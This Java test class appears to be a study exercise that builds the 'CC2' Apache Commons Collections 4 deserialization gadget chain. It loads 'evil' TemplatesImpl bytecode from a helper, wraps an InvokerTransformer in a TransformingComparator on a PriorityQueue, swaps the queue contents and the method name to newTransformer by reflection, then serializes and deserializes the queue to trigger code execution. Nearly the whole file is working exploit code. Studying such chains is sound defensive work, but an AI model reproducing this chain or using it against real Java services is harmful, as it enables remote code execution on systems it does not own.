package Test_CC;

import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Test_CC2_2 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Templates templates =  ExpUtils.getEvilTemplates();
        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0],new Object[0]);
        PriorityQueue priorityQueue = new PriorityQueue(2,new TransformingComparator((transformer) ));
        priorityQueue.add(1);
        priorityQueue.add(1);

        ReflectUtils.setFields(transformer,"iMethodName","newTransformer");
        Field queue =   ReflectUtils.getFields(priorityQueue,"queue");
        Object[] objects = (Object[]) queue.get(priorityQueue);
        objects[0] = templates;
        objects[1] = 1;

        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);
    }
}
